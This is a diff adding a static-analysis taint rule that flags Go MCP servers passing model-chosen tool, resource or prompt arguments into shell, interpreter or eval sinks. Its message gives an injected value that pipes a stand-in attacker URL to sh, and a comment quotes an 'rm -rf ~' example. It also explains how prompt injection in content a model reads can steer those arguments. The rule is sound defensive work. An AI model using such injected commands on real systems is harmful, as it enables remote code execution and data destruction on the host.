@@ -1,0 +1,418 @@
+rules:
+  - id: mcp-tool-arg-to-shell-go
+    # Sources: mark3labs/mcp-go v1.3.0 (server.ToolHandlerFunc, mcp.NewTypedToolHandler,
+    # mcp.NewStructuredToolHandler, CallToolRequest.BindArguments) and the official
+    # modelcontextprotocol/go-sdk v1.8.0 (mcp.AddTool's ToolHandlerFor[In, Out],
+    # Server.AddTool's ToolHandler with raw req.Params.Arguments). The pattern-sources,
+    # pattern-propagators, and the first two sanitizers are shared with
+    # mcp-tool-arg-option-injection-go and mcp-tool-arg-to-sql-go (build.py SHARED_BLOCKS
+    # "MCP tool sources (Go)"); the value sanitizers after them are shared with
+    # mcp-tool-arg-to-sql-go. Edit each block with its group.
+    # Resource templates and prompts (since 2026-10-25): mcp-go v1.3.0
+    # ResourceTemplateHandlerFunc / PromptHandlerFunc (mcp.ReadResourceRequest,
+    # mcp.GetPromptRequest) and go-sdk v1.8.0 ResourceHandler / PromptHandler
+    # (*mcp.ReadResourceRequest, *mcp.GetPromptRequest).
+    languages: [go]
+    severity: ERROR
+    message: >-
+      An MCP tool argument, resource-template parameter, or prompt argument reaches a shell or
+      code-execution sink. The client fills every one of them, and clients let the model
+      choose them (tool arguments always, resource URIs and prompt arguments in many clients);
+      the server can't tell who did. A prompt injection in anything the model has read (a web
+      page, an issue, a file, another tool's result) can choose them for it, so a value like
+      `main; curl https://attacker.example | sh` runs as a command on the machine hosting this
+      server. Run the program directly with each value as its own argument
+      (`exec.Command("git", "log", "--", ref)`), parse numbers with `strconv`, check the value
+      against an allowlist or an anchored pattern (`^[\w./-]+$`), or quote it with
+      `shellescape.Quote()` when a shell is unavoidable. `strconv.Quote` and `%q` are Go
+      quoting, not shell quoting: `$(...)` still runs inside their double quotes.
+    mode: taint
+    options:
+      # Values of a numeric or boolean Go type (a typed handler's `Count int` field) can't
+      # carry command text.
+      taint_assume_safe_numbers: true
+      taint_assume_safe_booleans: true
+    pattern-sources:
+      # A tool, resource, or prompt handler's request parameter, in any function, method, or
+      # function literal with one: mcp-go's mcp.CallToolRequest, mcp.ReadResourceRequest, and
+      # mcp.GetPromptRequest (values) and the go-sdk's *mcp.CallToolRequest,
+      # *mcp.ReadResourceRequest, and *mcp.GetPromptRequest. That covers handlers registered
+      # inline, as named functions or methods, through AddTools / ServerTool,
+      # AddResourceTemplate(s) / AddPrompt(s), and middleware. Everything read from it is the
+      # client's: GetString, RequireString, GetArguments, Params.Arguments, and a resource
+      # read's Params.URI (mcp-go also fills Params.Arguments with the template's variables).
+      # Resource and prompt parameters count since 2026-10-25: clients let the model fill
+      # them. A handler for a resource at a fixed URI gets only that URI.
+      - patterns:
+          - pattern-either:
+              - pattern: func $F(..., $REQ $T, ...) $RET {...}
+              - pattern: func(..., $REQ $T, ...) $RET {...}
+          - metavariable-regex:
+              metavariable: $T
+              regex: ^\*?(?:\w+\.)?(?:CallToolRequest|ReadResourceRequest|GetPromptRequest)$
+          - focus-metavariable: $REQ
+      # The decoded arguments of a typed handler, the parameter after the request:
+      # mcp-go's mcp.NewTypedToolHandler / NewStructuredToolHandler func(ctx, req, args T)
+      # and the go-sdk's mcp.AddTool func(ctx, req, in In) (*CallToolResult, Out, error).
+      - patterns:
+          - pattern-either:
+              - pattern: func $F(..., $REQ $T, $ARGS $AT) $RET {...}
+              - pattern: func(..., $REQ $T, $ARGS $AT) $RET {...}
+          - metavariable-regex:
+              metavariable: $T
+              regex: ^\*?(?:\w+\.)?CallToolRequest$
+          - focus-metavariable: $ARGS
+    pattern-propagators:
+      # Decoding the arguments into a struct: mcp-go's req.BindArguments(&args), and
+      # json.Unmarshal / a json.Decoder / mapstructure over req.Params.Arguments or
+      # req.GetArguments().
+      - pattern: $REQ.BindArguments(&$TO)
+        from: $REQ
+        to: $TO
+      - pattern: json.Unmarshal($FROM, &$TO)
+        from: $FROM
+        to: $TO
+      - pattern: $FROM.Decode(&$TO)
+        from: $FROM
+        to: $TO
+      - pattern: mapstructure.Decode($FROM, &$TO)
+        from: $FROM
+        to: $TO
+      - pattern: mapstructure.WeakDecode($FROM, &$TO)
+        from: $FROM
+        to: $TO
+      # Text written into a strings.Builder or bytes.Buffer.
+      - pattern: $TO.WriteString($FROM)
+        from: $FROM
+        to: $TO
+      - pattern: $TO.Write($FROM)
+        from: $FROM
+        to: $TO
+      - pattern: fmt.Fprintf(&$TO, $FMT, ..., $FROM, ...)
+        from: $FROM
+        to: $TO
+      - pattern: fmt.Fprint(&$TO, ..., $FROM, ...)
+        from: $FROM
+        to: $TO
+    pattern-sanitizers:
+      # Typed reads of the request are numbers or booleans, and the session, the HTTP
+      # headers, and the tool name are not arguments the model writes.
+      - exact: true
+        patterns:
+          - pattern-either:
+              - pattern: $REQ.GetInt(...)
+              - pattern: $REQ.RequireInt(...)
+              - pattern: $REQ.GetFloat(...)
+              - pattern: $REQ.RequireFloat(...)
+              - pattern: $REQ.GetBool(...)
+              - pattern: $REQ.RequireBool(...)
+              - pattern: $REQ.GetIntSlice(...)
+              - pattern: $REQ.RequireIntSlice(...)
+              - pattern: $REQ.GetFloatSlice(...)
+              - pattern: $REQ.RequireFloatSlice(...)
+              - pattern: $REQ.GetBoolSlice(...)
+              - pattern: $REQ.RequireBoolSlice(...)
+              - pattern: $REQ.Session
+              - pattern: $REQ.Extra
+              - pattern: $REQ.Header
+              - pattern: $REQ.Params.Name
+      # A value used inside a `switch` arm whose labels are all literals, Go's usual
+      # membership check: `switch branch { case "main", "develop": ... }`, also with an init
+      # (`switch v := req.GetString("v", ""); v {`) or on the expression itself
+      # (`switch req.GetString("mode", "") { case "fast": ... }`). The `default:` arm, an arm
+      # with a variable label, and a tagless `switch { case cond: }` stay tainted. OpenGrep
+      # doesn't scope a `switch $X { case $L: ... }` pattern to one arm, so the arm is found
+      # by its text (gofmt indentation: the arm runs until the next line at the `case`
+      # indent) and the subject is compared with str().
+      - patterns:
+          - pattern-regex: >-
+              (?m)^(?<SWI>[ \t]*)switch[ \t]+(?|(?<SUBJ>\w+)[ \t]*:=[^;\n]*;[ \t]*\k<SUBJ>|(?<SUBJ>[^\n{;]+?))[ \t]*\{[ \t]*\n(?:(?!\k<SWI>\})[^\n]*\n)*?\k<SWI>case[ \t]+(?:"[^"\n]*"|`[^`\n]*`|'[^'\n]+'|-?\d[\w.]*)(?:[ \t]*,[ \t]*(?:"[^"\n]*"|`[^`\n]*`|'[^'\n]+'|-?\d[\w.]*))*[ \t]*:[^\n]*\n\K(?:\k<SWI>[ \t]+[^\n]*\n|[ \t]*\n)*
+          - pattern: $E
+          - metavariable-comparison:
+              comparison: str($E) == str($SUBJ)
+      # Shared with mcp-tool-arg-to-sql-go (build.py SHARED_BLOCKS "tool-argument value
+      # sanitizers (Go)"): edit them together.
+      # An allowlist check before use with a pattern anchored at both ends (Go's MatchString
+      # finds a match anywhere, so `[a-z]+` lets "ok; rm -rf ~" through): inline, or a
+      # regexp compiled into a variable in this file. A regexp declared in a `var (...)`
+      # group or another file can't be read, so its check counts.
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern: regexp.MustCompile($PAT).MatchString($X)
+                      - pattern: regexp.MatchString($PAT, $X)
+                  - metavariable-regex:
+                      metavariable: $PAT
+                      regex: ^["`](?:\^|\\{1,2}A).*(?:\$|\\{1,2}z)["`]$
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          var $RE = regexp.MustCompile($PAT)
+                          ...
+                      - pattern-inside: |
+                          $RE := regexp.MustCompile($PAT)
+                          ...
+                  - pattern: $RE.MatchString($X)
+                  - metavariable-regex:
+                      metavariable: $PAT
+                      regex: ^["`](?:\^|\\{1,2}A).*(?:\$|\\{1,2}z)["`]$
+              - patterns:
+                  - pattern: $RE.MatchString($X)
+                  - pattern-not-inside: |
+                      var $RE = regexp.MustCompile($PAT)
+                      ...
+                  - pattern-not-inside: |
+                      $RE := regexp.MustCompile($PAT)
+                      ...
+          - focus-metavariable: $X
+      # An allowlist membership check before use: slices.Contains(allowed, v),
+      # `if _, ok := allowed[v]; !ok`, or a lookup in a map[string]bool.
+      - by-side-effect: true
+        patterns:
+          - pattern-either:
+              - pattern: slices.Contains($LIST, $X)
+              - pattern: '_, $OK := ($M : map[$K]$V)[$X]'
+              - pattern: '($M : map[$K]bool)[$X]'
+          - focus-metavariable: $X
+      # A value looked up in a typed table by a model-chosen key (`formatFlags[format]`).
+      # Maps of `any` (the arguments themselves) and literal keys (`args["cmd"]`) stay
+      # tainted.
+      - exact: true
+        patterns:
+          - pattern: '($M : map[$K]$V)[$X]'
+          - metavariable-regex:
+              metavariable: $V
+              regex: ^(?!any$|interface\s*\{\s*\}$)
+          - metavariable-regex:
+              metavariable: $X
+              regex: ^(?!["`])
+      - exact: true
+        pattern-either:
+          - pattern: strconv.Atoi(...)
+          - pattern: strconv.ParseInt(...)
+          - pattern: strconv.ParseUint(...)
+          - pattern: strconv.ParseFloat(...)
+          - pattern: strconv.ParseBool(...)
+          - pattern: strconv.Itoa(...)
+          - pattern: strconv.FormatInt(...)
+          - pattern: strconv.FormatUint(...)
+      # Shell quoting: github.com/alessio/shellescape v1.6.1 and
+      # github.com/kballard/go-shellquote. (strconv.Quote and %q are not shell quoting.)
+      - exact: true
+        pattern-either:
+          - pattern: shellescape.Quote(...)
+          - pattern: shellescape.QuoteCommand(...)
+          - pattern: shellquote.Join(...)
+    pattern-sinks:
+      # An argv that starts a shell on the next item: exec.Command("bash", "-c", cmd),
+      # exec.CommandContext(ctx, "sh", "-lc", cmd), exec.Command(shell, "/C", cmd), or a
+      # []string argv for syscall.Exec, os.StartProcess, or exec.Command(argv[0],
+      # argv[1:]...). The shell comes right before its -c flag or after one option
+      # (`bash -e -c`); a shell held in a constant counts, and so does one named like a
+      # shell or read from $SHELL / %COMSPEC%. Only the command counts: later items become
+      # the script's $0, $1, ... and are not parsed as commands.
+      - patterns:
+          - pattern-either:
+              - pattern: exec.Command($SH, $FLAG, $CMD, ...)
+              - pattern: exec.CommandContext($CTX, $SH, $FLAG, $CMD, ...)
+              - pattern: '[]string{..., $SH, $FLAG, $CMD, ...}'
+              - patterns:
+                  - pattern-either:
+                      - pattern: exec.Command($SH, $OPT, $FLAG, $CMD, ...)
+                      - pattern: exec.CommandContext($CTX, $SH, $OPT, $FLAG, $CMD, ...)
+                      - pattern: '[]string{..., $SH, $OPT, $FLAG, $CMD, ...}'
+                  - metavariable-regex:
+                      metavariable: $OPT
+                      regex: ^["`](?:-[a-zA-Z]{1,3}|--[a-z][\w-]*)["`]$
+          - metavariable-regex:
+              metavariable: $FLAG
+              regex: ^["`](?:-[a-zA-Z]*c[a-zA-Z]*|/[cCkK]|-(?i:command))["`]$
+          - metavariable-pattern:
+              metavariable: $SH
+              pattern-either:
+                - pattern: '"=~/^(?:.*[/])?(?:(?:ba|da|z|k|fi|c|tc)?sh|cmd([.]exe)?|powershell([.]exe)?|pwsh)$/"'
+                - pattern: os.Getenv("SHELL")
+                - pattern: os.Getenv("COMSPEC")
+                - patterns:
+                    - pattern: $NAME
+                    - metavariable-regex:
+                        metavariable: $NAME
+                        regex: ^(?:\w+\.)*\w*(?:[sS]hell|SHELL)\w*$
+          - focus-metavariable: $CMD
+      # An argv that starts an interpreter on inline code: exec.Command("python3", "-c",
+      # code), exec.Command("node", "-e", code), []string{"deno", "eval", code}. Each
+      # interpreter is paired with its own eval flag, so `node -c` (syntax check) doesn't
+      # count. The eval flag comes right after the interpreter or after one option that
+      # takes no value ("python3", "-I", "-c", code).
+      - patterns:
+          - pattern-either:
+              - pattern: exec.Command($BIN, $FLAG, $CODE, ...)
+              - pattern: exec.CommandContext($CTX, $BIN, $FLAG, $CODE, ...)
+              - pattern: '[]string{..., $BIN, $FLAG, $CODE, ...}'
+              - patterns:
+                  - pattern-either:
+                      - pattern: exec.Command($BIN, $OPT, $FLAG, $CODE, ...)
+                      - pattern: exec.CommandContext($CTX, $BIN, $OPT, $FLAG, $CODE, ...)
+                      - pattern: '[]string{..., $BIN, $OPT, $FLAG, $CODE, ...}'
+                  - metavariable-regex:
+                      metavariable: $OPT
+                      regex: ^["`](?:-(?![WXmr]["`])[a-zA-Z]{1,3}|--[a-z][\w-]*(?<!require)(?<!import)(?<!loader))["`]$
+          - metavariable-comparison:
+              comparison: >-
+                (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:python[0-9.]*|py)(?:[.]exe)?$", str($BIN))
+                and str($FLAG) == "-c")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:node|nodejs|bun|tsx|ts-node)(?:[.]exe)?$", str($BIN))
+                and re.match("^(?:-e|--eval|-p|--print|-pe)$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?deno(?:[.]exe)?$", str($BIN)) and str($FLAG) == "eval")
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?(?:ruby|perl)(?:[.]exe)?$", str($BIN)) and re.match("^-[eE]$", str($FLAG)))
+                or (re.match("^(?:[a-zA-Z0-9_./-]*/)?php(?:[.]exe)?$", str($BIN)) and str($FLAG) == "-r")
+          - focus-metavariable: $CODE
+      # Code written to a file and then run in the same function: os.WriteFile(path, code,
+      # ...) or a file from os.CreateTemp written with WriteString / Write, and later
+      # exec.Command("bash", path), exec.Command("python3", f.Name()), or the file run as
+      # the program itself. Only the written contents count; a file handed to a program
+      # that only reads it (git, a linter) doesn't.
+      - patterns:
+          - pattern-either:
+              - patterns:
+                  - pattern-either:
+                      - pattern-inside: |
+                          os.WriteFile($PATH, $CODE, ...)
+                          ...
+                          exec.Command($BIN, ..., $PATH, ...)
+                      - pattern-inside: |
+                          os.WriteFile($PATH, $CODE, ...)
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $PATH, ...)
+                      - pattern-inside: |
+                          if $ERR := os.WriteFile($PATH, $CODE, ...); $COND {
+                            ...
+                          }
+                          ...
+                          exec.Command($BIN, ..., $PATH, ...)
+                      - pattern-inside: |
+                          if $ERR := os.WriteFile($PATH, $CODE, ...); $COND {
+                            ...
+                          }
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $PATH, ...)
+                      - pattern-inside: |
+                          $F.WriteString($CODE)
+                          ...
+                          exec.Command($BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          $F.WriteString($CODE)
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          $F.Write($CODE)
+                          ...
+                          exec.Command($BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          $F.Write($CODE)
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          if $N, $ERR := $F.WriteString($CODE); $COND {
+                            ...
+                          }
+                          ...
+                          exec.Command($BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          if $N, $ERR := $F.WriteString($CODE); $COND {
+                            ...
+                          }
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          if $N, $ERR := $F.Write($CODE); $COND {
+                            ...
+                          }
+                          ...
+                          exec.Command($BIN, ..., $F.Name(), ...)
+                      - pattern-inside: |
+                          if $N, $ERR := $F.Write($CODE); $COND {
+                            ...
+                          }
+                          ...
+                          exec.CommandContext($CTX, $BIN, ..., $F.Name(), ...)
+                  - metavariable-regex:
+                      metavariable: $BIN
+                      regex: ^["`](?:[\w./-]*/)?(?:python[\d.]*|py|node|nodejs|deno|bun|ruby|perl|php|(?:ba|da|z|k|fi|c|tc)?sh|pwsh|powershell)(?:\.exe)?["`]$
+              - pattern-inside: |
+                  os.WriteFile($PATH, $CODE, ...)
+                  ...
+                  exec.Command($PATH, ...)
+              - pattern-inside: |
+                  os.WriteFile($PATH, $CODE, ...)
+                  ...
+                  exec.CommandContext($CTX, $PATH, ...)
+              - pattern-inside: |
+                  if $ERR := os.WriteFile($PATH, $CODE, ...); $COND {
+                    ...
+                  }
+                  ...
+                  exec.Command($PATH, ...)
+              - pattern-inside: |
+                  if $ERR := os.WriteFile($PATH, $CODE, ...); $COND {
+                    ...
+                  }
+                  ...
+                  exec.CommandContext($CTX, $PATH, ...)
+          # The written contents themselves, not a later use of the same name.
+          - pattern-either:
+              - pattern-inside: os.WriteFile($PATH, $CODE, ...)
+              - pattern-inside: $F.WriteString($CODE)
+              - pattern-inside: $F.Write($CODE)
+          - pattern: $CODE
+      # Go source run by the yaegi interpreter (github.com/traefik/yaegi v0.16.1) with the
+      # standard library loaded (i.Use(stdlib.Symbols)), which gives it os/exec and file
+      # access.
+      - patterns:
+          - pattern-either:
+              - pattern-inside: $I.Eval($CODE)
+              - pattern-inside: $I.EvalWithContext($CTX, $CODE)
+          - pattern-not-regex: '\A(?:(?![^\n]*?"github\.com/traefik/yaegi/interp")[^\n]*+\n)*+(?![^\n]*?"github\.com/traefik/yaegi/interp")[^\n]*+\z'
+          - pattern-not-regex: '\A(?:(?![^\n]*?\b(?:stdlib|unrestricted)\.Symbols\b)[^\n]*+\n)*+(?![^\n]*?\b(?:stdlib|unrestricted)\.Symbols\b)[^\n]*+\z'
+          - pattern: $CODE
+    metadata:
+      category: security
+      subcategory: [vuln]
+      pack-category: mcp-server
+      owasp-llm:
+        - "LLM10:2026 - Improper Output Handling"
+        - "LLM05:2025 - Improper Output Handling"
+      owasp-agentic:
+        - "ASI05 - Unexpected Code Execution (RCE)"
+        - "ASI02 - Tool Misuse and Exploitation"
+      owasp-mcp:
+        - "MCP05:2025 - Command Injection & Execution"
+      owasp-aisvs:
+        - "v1.01-C10.4.4 - Schema, Message, and Input Validation"
+      mitre-atlas:
+        - "AML.T0053 - AI Agent Tool Invocation"
+        - "AML.T0050 - Command and Scripting Interpreter"
+      cwe:
+        - "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+      confidence: HIGH
+      likelihood: MEDIUM
+      impact: HIGH
+      technology: [mcp, mcp-go, go-sdk, os-exec, yaegi]
+      # SDK shapes checked 2026-10-24 against the tagged sources below.
+      references:
+        - https://github.com/mark3labs/mcp-go/blob/v1.3.0/mcp/prompts.go
+        - https://github.com/mark3labs/mcp-go/blob/v1.3.0/mcp/types.go
+        - https://github.com/modelcontextprotocol/go-sdk/blob/v1.8.0/mcp/resource.go
+        - https://github.com/modelcontextprotocol/go-sdk/blob/v1.8.0/mcp/prompt.go
+        - https://github.com/mark3labs/mcp-go/blob/v1.3.0/server/server.go
+        - https://github.com/mark3labs/mcp-go/blob/v1.3.0/mcp/tools.go
+        - https://github.com/mark3labs/mcp-go/blob/v1.3.0/mcp/typed_tools.go
+        - https://github.com/modelcontextprotocol/go-sdk/blob/v1.8.0/mcp/tool.go
+        - https://github.com/modelcontextprotocol/go-sdk/blob/v1.8.0/mcp/server.go
+        - https://pkg.go.dev/os/exec
+        - https://github.com/alessio/shellescape/blob/v1.6.1/shellescape.go
+        - https://github.com/OWASP/www-project-mcp-top-10/blob/165fe0f78ef104459237b4a8e0f6e78db9b02391/2025/MCP05-2025%E2%80%93Command-Injection%26Execution.md
+        - https://cwe.mitre.org/data/definitions/78.html
